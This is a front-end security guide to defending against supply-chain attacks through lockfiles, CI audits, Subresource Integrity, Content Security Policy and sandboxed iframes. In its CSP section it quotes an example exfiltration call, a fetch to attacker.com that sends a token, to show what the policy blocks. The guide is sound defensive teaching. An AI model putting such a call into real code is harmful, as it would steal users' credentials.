In modern front-end system design, dependency security addresses supply chain risks—where an attacker compromises a third-party package (`npm`, `yarn`, `pnpm`) or hosted CDN script to execute malicious code within your users' browser runtime.

Because front-end JavaScript bundles execute directly on the client side, a compromised dependency can read in-memory state, capture user keystrokes, exfiltrate sensitive data, or redirect users.

---

## 1. Supply Chain Attack Vectors in Front-End Applications

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                       SUPPLY CHAIN ATTACK VECTORS                           │
│                                                                             │
│  1. Compromised Package Maintainer (Typosquatting / Account Takeover)       │
│     An attacker publishes a malicious patch version (e.g., event-stream)    │
│                                                                             │
│  2. Direct Script Injection via Unverified CDNs                             │
│     An attacker tampers with a hosted JS file on an external CDN            │
│                                                                             │
│  3. Transitive Dependency Vulnerabilities                                   │
│     A deep child dependency of an npm package introduces a known CVE         │
└─────────────────────────────────────────────────────────────────────────────┘

```

---

## 2. Architectural Pillars for Third-Party Dependency Security

```
                                DEPENDENCY DEFENSE-IN-DEPTH
                                             │
    ┌────────────────────────────────────────┼────────────────────────────────────────┐
    ▼                                        ▼                                        ▼
[ 1. Build & CI/CD Pipeline ]        [ 2. Client Browser Runtime ]        [ 3. Network & Edge Layer ]
- Lockfile Pinning                   - Subresource Integrity (SRI)        - Content Security Policy (CSP)
- Automated Vulnerability Audits     - Isolated Sandboxed iFrames         - Restrict Outbound Domains
- Dependency Scanners (Snyk/Audit)   - Restricted DOM/Window Access      - Block Unapproved Connections

```

---

## 3. Practical Code & Architecture Implementation

### A. CI/CD & Build Pipeline Security (Lockfiles & Automated Audits)

#### 1. Commit Lockfiles & Lock Dependency Versions

Always commit `package-lock.json`, `yarn.lock`, or `pnpm-lock.yaml`. Avoid wildcard ranges (`^` or `~`) for critical security or utility dependencies to prevent auto-installing compromised minor/patch releases.

```json
// package.json — Pin exact versions for sensitive packages
{
  "dependencies": {
    "axios": "1.7.2",
    "dompurify": "3.1.5"
  }
}

```

#### 2. Enforce Lockfile Integrity in CI Builds

Run CI/CD installation with frozen lockfile commands so builds fail if the lockfile was altered without review:

```bash
# npm
npm ci

# yarn
yarn install --frozen-lockfile

# pnpm
pnpm install --frozen-lockfile

```

#### 3. Automated Vulnerability Scanning in GitHub Actions

Integrate automated dependency audit tools into your CI workflow to block pull requests containing known CVEs.

```yaml
# .github/workflows/security-audit.yml
name: Dependency Security Audit

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      # Fail build if dependencies contain High or Critical vulnerabilities
      - name: Run Audit
        run: npm audit --audit-level=high

```

---

### B. Subresource Integrity (SRI) for CDN Dependencies

If your front-end imports third-party scripts from external CDNs (e.g., Google Analytics, Stripe, Bootstrap), use **Subresource Integrity (SRI)**. The browser verifies the cryptographic hash of the fetched file before executing it. If an attacker modifies the script on the CDN, the hash mismatch causes the browser to reject execution.

```html
<!-- HTML template in your front-end repository -->
<script 
  src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" 
  integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" 
  crossorigin="anonymous">
</script>

```

---

### C. Restricting Dependency Capabilities via Content Security Policy (CSP)

Even if a malicious third-party script gets bundled into your client application, a strict **Content Security Policy** prevents the script from exfiltrating stolen user data to an attacker-controlled server.

```http
# Server/CDN Response Header
Content-Security-Policy: default-src 'self'; script-src 'self' https://js.stripe.com; connect-src 'self' https://api.yourdomain.com https://api.stripe.com; object-src 'none';

```

* **How it defends:** If an `npm` dependency is infected with telemetry exfiltration code trying to `fetch('[https://attacker.com/steal?data=](https://attacker.com/steal?data=)' + token)`, the browser blocks the network call because `[https://attacker.com](https://attacker.com)` is not in `connect-src`.

---

### D. Runtime Sandboxing for Untrusted Third-Party UI Plugins

When integrating heavy third-party vendor components (e.g., chat widgets, 3D viewers, feedback tools), render them inside a sandboxed `<iframe>` to isolate their execution context from your main application DOM and memory space.

```tsx
// src/components/VendorWidgetSandbox.tsx
import React from 'react';

export const VendorWidgetSandbox: React.FC<{ widgetUrl: string }> = ({ widgetUrl }) => {
  return (
    <iframe
      src={widgetUrl}
      title="Third Party Vendor Component"
      width="100%"
      height="400"
      /*
        CRITICAL SANDBOX ISOLATION:
        - 'allow-scripts': Lets the widget execute JavaScript.
        - OMIT 'allow-same-origin': Forces the iframe into a unique 'null' origin context.
          This prevents the vendor code from reading host cookies, localStorage, or window.parent.document.
      */
      sandbox="allow-scripts allow-forms"
      loading="lazy"
    />
  );
};

```

---

## Summary Strategy Matrix

| Risk Scenario                              | Front-End System Control                                                 | Where Applied                         |
| ------------------------------------------ | ------------------------------------------------------------------------ | ------------------------------------- |
| **Compromised NPM Package**                | Immutable lockfiles (`npm ci`) & Automated CI Audits (`npm audit`, Snyk) | CI/CD Pipeline & Build Step           |
| **CDN File Tampering**                     | Subresource Integrity (`integrity="sha384-..."`)                         | HTML Scripts / Webpack / Vite Plugins |
| **Data Exfiltration by Malicious Package** | Strict `connect-src` in Content Security Policy (CSP)                    | CDN / Nginx / Edge Proxy Headers      |
| **Vendor Script DOM & Cookie Theft**       | Sandboxed `<iframe>` without `allow-same-origin`                         | Layout / Component Architecture       |
